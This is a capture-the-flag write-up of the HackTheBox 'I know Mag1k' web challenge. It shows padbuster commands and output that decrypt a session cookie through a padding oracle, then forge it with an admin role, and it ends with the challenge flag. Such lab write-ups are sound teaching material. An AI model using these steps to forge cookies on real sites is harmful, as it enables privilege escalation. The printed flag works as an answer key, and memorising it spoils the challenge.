---
title: I know Mag1k Challenge- HackTheBox
author: pwnd_root
date: 2020-07-24 05:30:00 +0530
excerpt: Note that this is still an active challenge, so it's highly recommended that you try a bit harder before heading inside. 
         Feel free to reach me on my socials for spoiler-free nudges.
categories: [HackTheBox, Challenge]
thumbnail: /assets/img/posts/iknowmag1k/info.png
tags: [htb, web, padbuster, burpsuite]
---
> Note: Decoding and encoding the padding takes a substantial time and so the cookie values would be different. 
> So blind copy-paste of commands as-is is not recommended and is never recommended any where else either. 

*[Image: Info]*

Browsing to the generated instance, [http://docker.hackthebox.eu:30256/login.php](http://docker.hackthebox.eu:30256/login.php)
revealed a login page. The source code of the page offered no useful information and lazy admin passwords did not
work. Therefore, a new user registration was carried out with the following values.
```text
Username    : testuser
email       : test@magic.htb
password    : Offsec@098
```
Upon registration, a login was carried out with **testuser:Offsec@098**, which redirected to 
[http://docker.hackthebox.eu:30256/profile.php](http://docker.hackthebox.eu:30256/profile.php), a static user profile
page with no useful information. The request was captured with *BurpSuite* for analysis and it revealed an interesting
cookie. The captured request is given below.
```html
GET /profile.php HTTP/1.1
Host: docker.hackthebox.eu:30256
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://docker.hackthebox.eu:30256/login.php

Connection: close
Cookie: ajs_anonymous_id=%224d9cd715-9f20-4d7c-a76b-a9a997d488c5%22; _ga=GA1.2.882945546.1595059372; _gid=GA1.2.1728392017.1595059372; ajs_user_id=%22cc1ac718e4e7ad76d05f28503f223c0a%22; __auc=c2a763ba17368c420ce42ebe869; PHPSESSID=s667u5g10dk1f1l40h0473ml35; iknowmag1k=yriBS24SRCyrBeCi4PgJH00Xah22stPDhIPG5%2Bo%2FIcWQFSxCntd3latWhR31u2dq0%2Fs2oe05D9M%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
From the challenge title, as well as the stand-alone name, the cookie 
**iknowmag1k=yriBS24SRCyrBeCi4PgJH00Xah22stPDhIPG5%2Bo%2FIcWQFSxCntd3latWhR31u2dq0%2Fs2oe05D9M%3D** seemed interesting.
With a bit of googling and scouring the forum, it was identified as *padding oracle*[^footnote]. 
<br>
Using ***padbuster***, the value was decrypted as follows.
```shell 
[pwnd_root@manjaro IKnowMag1k]$ padbuster http://docker.hackthebox.eu:30256/profile.php yriBS24SRCyrBeCi4PgJH00Xah22stPDhIPG5%2Bo%2FIcWQFSxCntd3latWhR31u2dq0%2Fs2oe05D9M%3D 8 --cookies iknowmag1k=yriBS24SRCyrBeCi4PgJH00Xah22stPDhIPG5%2Bo%2FIcWQFSxCntd3latWhR31u2dq0%2Fs2oe05D9M%3D

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 302
[+] Location: login.php
[+] Content Length: 0

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 6 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       302     0       login.php
2 **    255     500     0       N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2
---SNIP---
-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): {"user":"testuser","role":"user"}

[+] Decrypted value (HEX): 7B2275736572223A227465737475736572222C22726F6C65223A2275736572227D0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F

[+] Decrypted value (Base64): eyJ1c2VyIjoidGVzdHVzZXIiLCJyb2xlIjoidXNlciJ9Dw8PDw8PDw8PDw8PDw8P

-------------------------------------------------------
```
After a substantial amount of time, *padbuster* had decrypted the cookie value to be 
**{"user":"testuser","role":"user"}**. This implies that the target identifies users and their roles through this cookie.
Therefore by changing the value of role to 'admin', we should, theoretically, get access as admin.
<br>
Luckily, padbuster can also be used to encode data with the *-plaintext* option as 
 **-plaintext "{\"user\":\"testuser\",\"role\":\"admin\"}"**. The same is given in the section below.

```shell 
[pwnd_root@manjaro IKnowMag1k]$ padbuster http://docker.hackthebox.eu:30407/profile.php 2Motz05ZxzBumLZHGAWo0CQd1iuyzY1CCbnARHQoKdDmAtAGg9Fk58HFXrnqgL4O%2BbWfLa6SPoc%3D 8 --cookies iknowmag1k=2Motz05ZxzBumLZHGAWo0CQd1iuyzY1CCbnARHQoKdDmAtAGg9Fk58HFXrnqgL4O%2BbWfLa6SPoc%3D -plaintext "{\"user\":\"testuser\",\"role\":\"admin\"}"

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 302
[+] Location: login.php
[+] Content Length: 0

INFO: Starting PadBuster Encrypt Mode
---SNIP---
-------------------------------------------------------
** Finished ***

[+] Encrypted value is: pre7WDXGUZOwH7WQkWv01hoj3uN85OECjW1S10LFuOJzE0TAZaxhmAAAAAAAAAAA
-------------------------------------------------------
```
The identified value is replaced for the captured original cookie and the request is sent again, through 
BurpSuite *Repeater*. The flag was received on the response.

**Request**
```html
GET /profile.php HTTP/1.1
Host: docker.hackthebox.eu:30407
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ajs_anonymous_id=%224d9cd715-9f20-4d7c-a76b-a9a997d488c5%22; _ga=GA1.2.882945546.1595059372; _gid=GA1.2.1728392017.1595059372; ajs_user_id=%22cc1ac718e4e7ad76d05f28503f223c0a%22; __auc=c2a763ba17368c420ce42ebe869; PHPSESSID=s667u5g10dk1f1l40h0473ml35; iknowmag1k=pre7WDXGUZOwH7WQkWv01hoj3uN85OECjW1S10LFuOJzE0TAZaxhmAAAAAAAAAAA
Upgrade-Insecure-Requests: 1
```
**Response**
```html
       <div class="author">
         <a href="#">
         *[Image: ...]*
         <h4 class="title">
            Admin<br />
            <small>
               HTB{Padd1NG_Or4cl3z_AR3_WaY_T0o_6en3r0ys_ArenT_tHey???}
            </small>
         </h4>
         </a>
       </div>                                   
```

*[Image: Flag]*

[^footnote]:[https://resources.infosecinstitute.com/padding-oracle-attack-2/](https://resources.infosecinstitute.com/padding-oracle-attack-2/)